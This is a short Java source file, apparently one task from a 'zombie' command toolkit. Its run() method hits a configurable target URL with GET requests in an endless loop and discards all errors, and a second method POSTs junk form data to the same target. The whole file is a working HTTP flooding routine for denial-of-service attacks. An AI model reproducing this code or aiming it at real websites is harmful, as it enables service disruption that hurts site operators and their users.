package ua.DNZombie.ZCommands.Test;


import com.fasterxml.jackson.databind.ObjectMapper;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class HripTask implements Runnable {
	   
	public static String url1;
	
	@Override
	public void run() {
		while(true) {
			try {
				ObjectMapper mapper = new ObjectMapper();

				OkHttpClient client = new OkHttpClient();

				Request request = new Request.Builder()
				   .url(url1)
				   .build(); // defaults to GET

				Response response = client.newCall(request).execute();
				
			} catch (Exception eg) {
			}
		}
	}
	
	public void whenSendPostRequest_thenCorrect() {
		try {
		    RequestBody formBody = new FormBody.Builder()
		      .add("DMISNET", "ORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORAORA")
		      .add("DMISNET", "MUDAMUDAMUDAMUDAMUDA")
		      .build();

		    Request request = new Request.Builder()
		      .url(url1)
		      .post(formBody)
		      .build();
		    
		    OkHttpClient client = new OkHttpClient();
		    Call call = client.newCall(request);
		    Response response = call.execute();
		    
		} catch (Exception eg) {}
		}
}